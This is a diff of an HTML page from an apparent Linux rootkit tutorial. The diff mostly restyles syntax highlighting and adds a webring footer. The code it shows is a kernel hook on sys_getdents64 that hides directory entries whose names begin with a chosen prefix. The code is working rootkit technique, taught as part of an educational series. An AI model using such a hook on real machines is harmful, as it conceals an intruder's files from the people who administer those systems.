@@ -177,7 +177,7 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 <h1 id="directory-listings-in-linux">Directory Listings in Linux<a href="#directory-listings-in-linux" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>As usual, lets try to understand that underlying kernel functionality that we are hoping to <em>influence</em> before writing anything. We begin by checking the <a href="https://syscalls64.paolostivanin.com/">Linux Syscall Reference</a> for <code>sys_getdents</code>. This gives us two results, as mentioned earlier; one for 32-bit and another for 64-bit. We will focus on the 64-bit version, <code>sys_getdents64</code>, for now. The syscall reference directs us to <a href="https://github.com/torvalds/linux/blob/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs/readdir.c#L351"><code>fs/readdir.c</code></a>, where we find the definition for <code>sys_getdents64</code>.</p>
 <p>Because we want to control what this syscall returns to the user, it is helpful to take look at what this syscall actually does. To start us off, the function declaration is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SYSCALL_DEFINE3(getdents64, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, fd, <span style="color:#66d9ef">struct</span> linux_dirent64 __user <span style="color:#f92672">*</span>, dirent, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, count)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SYSCALL_DEFINE3</span>(getdents64, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, fd, <span style="color:#66d9ef">struct</span> linux_dirent64 __user <span style="color:#f92672">*</span>, dirent, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, count)
 </span></span></code></pre></div><p>This macro translates to the slightly more familar:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sys_getdents64</span>( <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> linux_dirent <span style="color:#ae81ff">64</span> __user <span style="color:#f92672">*</span> dirent, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count);
 </span></span></code></pre></div><p>That <code>linux_dirent64</code> struct is what contains the information about the directory listings (dirent is short for &ldquo;directory entry&rdquo;). We can find it&rsquo;s definition in <a href="https://github.com/torvalds/linux/blob/325d0eab4f31c6240b59d5b2b8042c88f59405b5/include/linux/dirent.h#L5"><code>include/linux/dirent.h</code></a>.</p>
@@ -226,8 +226,8 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>dirent_ker <span style="color:#f92672">=</span> NULL;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Call the real getdents64, and allocate ourselves a kernel buffer */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> orig_getdents64(regs);
-</span></span><span style="display:flex;"><span>    dirent_ker <span style="color:#f92672">=</span> kzalloc(ret, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">orig_getdents64</span>(regs);
+</span></span><span style="display:flex;"><span>    dirent_ker <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(ret, GFP_KERNEL);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Check that neither of the above failed */</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (dirent_ker <span style="color:#f92672">==</span> NULL) )
@@ -235,20 +235,20 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Copy from the userspace buffer dirent, to our kernel buffer dirent_ker */</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> error;
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_from_user(dirent_ker, dirent, ret);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(dirent_ker, dirent, ret);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> done;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Fiddle with dirent_ker */</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Copy dirent_ker back to userspace dirent */</span>
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_to_user(dirent, dirent_ker, ret);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>(dirent, dirent_ker, ret);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> done;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>done:
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Free our buffer and return */</span>
-</span></span><span style="display:flex;"><span>    kfree(dirent_ker);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kfree</span>(dirent_ker);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Hopefully by this point, the above skeleton makes perfect sense. It&rsquo;s only slightly different from where we started in <a href="../linux_rootkits_05/">Part 5</a>, but in that case the only &ldquo;fiddling&rdquo; we did was overwrite the kernel buffer with <code>0x00</code> before copying it back to userspace. This time around we need be a little cleverer.</p>
@@ -269,14 +269,14 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>current_dir, <span style="color:#f92672">*</span>dirent_ker <span style="color:#f92672">=</span> NULL;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> orig_getdents64(regs);
-</span></span><span style="display:flex;"><span>    dirent_ker <span style="color:#f92672">=</span> kzalloc(ret, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">orig_getdents64</span>(regs);
+</span></span><span style="display:flex;"><span>    dirent_ker <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(ret, GFP_KERNEL);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (dirent_ker <span style="color:#f92672">==</span> NULL) )
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ret;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> error;
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_from_user(dirent_ker, dirent, ret);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(dirent_ker, dirent, ret);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> done;
 </span></span><span style="display:flex;"><span>
@@ -290,10 +290,10 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 </span></span><span style="display:flex;"><span>        current_dir <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)dirent_ker <span style="color:#f92672">+</span> offset;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Compare the first bytes of current_dir-&gt;d_name to PREFIX */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( memcmp(PREFIX, current_dir<span style="color:#f92672">-&gt;</span>d_name, strlen(PREFIX)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">memcmp</span>(PREFIX, current_dir<span style="color:#f92672">-&gt;</span>d_name, <span style="color:#a6e22e">strlen</span>(PREFIX)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
 </span></span><span style="display:flex;"><span>        {
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">/* Print to the kernel buffer */</span>
-</span></span><span style="display:flex;"><span>            printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: Found %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current_dir<span style="color:#f92672">-&gt;</span>d_name);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printk</span>(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: Found %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current_dir<span style="color:#f92672">-&gt;</span>d_name);
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Increment offset by current_dir-&gt;d_reclen so that we iterate over
@@ -302,12 +302,12 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 </span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">+=</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_to_user(dirent, dirent_ker, ret);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>(dirent, dirent_ker, ret);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> done;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>done:
-</span></span><span style="display:flex;"><span>    kfree(dirent_ker);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kfree</span>(dirent_ker);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>If you want, you can try compiling this and check that it works (you might want to wait until the end, because you&rsquo;ll have to copy it out four times!). It should be clear what the new parts are doing (look for the comments), but if not, try re-reading the paragraph above it.</p>
@@ -329,14 +329,14 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>previous_dir, <span style="color:#f92672">*</span>current_dir, <span style="color:#f92672">*</span>dirent_ker <span style="color:#f92672">=</span> NULL;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> orig_getdents64(regs);
-</span></span><span style="display:flex;"><span>    dirent_ker <span style="color:#f92672">=</span> kzalloc(ret, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">orig_getdents64</span>(regs);
+</span></span><span style="display:flex;"><span>    dirent_ker <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(ret, GFP_KERNEL);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (dirent_ker <span style="color:#f92672">==</span> NULL) )
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ret;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> error;
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_from_user(dirent_ker, dirent, ret);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(dirent_ker, dirent, ret);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> done;
 </span></span><span style="display:flex;"><span>
@@ -344,14 +344,14 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        current_dir <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)dirent_ker <span style="color:#f92672">+</span> offset;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( memcmp(PREFIX, current_dir<span style="color:#f92672">-&gt;</span>d_name, strlen(PREFIX)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">memcmp</span>(PREFIX, current_dir<span style="color:#f92672">-&gt;</span>d_name, <span style="color:#a6e22e">strlen</span>(PREFIX)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
 </span></span><span style="display:flex;"><span>        {
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">/* Check for the special case when we need to hide the first entry */</span>
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>( current_dir <span style="color:#f92672">==</span> dirent_ker )
 </span></span><span style="display:flex;"><span>            {
 </span></span><span style="display:flex;"><span>                <span style="color:#75715e">/* Decrement ret and shift all the structs up in memory */</span>
 </span></span><span style="display:flex;"><span>                ret <span style="color:#f92672">-=</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen;
-</span></span><span style="display:flex;"><span>                memmove(current_dir, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)current_dir <span style="color:#f92672">+</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen, ret);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">memmove</span>(current_dir, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)current_dir <span style="color:#f92672">+</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen, ret);
 </span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>;
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">/* Hide the secret entry by incrementing d_reclen of previous_dir by
@@ -370,12 +370,12 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 </span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">+=</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_to_user(dirent, dirent_ker, ret);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>(dirent, dirent_ker, ret);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> done;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>done:
-</span></span><span style="display:flex;"><span>    kfree(dirent_ker);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kfree</span>(dirent_ker);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>It&rsquo;s worth taking a bit to absorb what&rsquo;s going on here and it would be no bad thing to go back and re-read each of the three versions of the hook and their explanations - it certainly took me a long time to write them using several different sources!</p>
@@ -444,6 +444,21 @@ Roughly speaking, directory listing is handled by the syscall sys_getdents64 and
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
+
+<div class="footer__webring">
+    <span>
+        <div>
+            this site is part of the <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi'>HauNTed wEbriNg</a>
+        </div>
+        <div>
+            <p>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?before=https://xcellerator.github.io/'>&lt;&lt;&lt;</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?random=https://xcellerator.github.io/'>RaNDom</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?after=https://xcellerator.github.io/'>&gt;&gt;&gt;</a>
+            </p>
+        </div>
+    </span>
+</div>
 
 
 
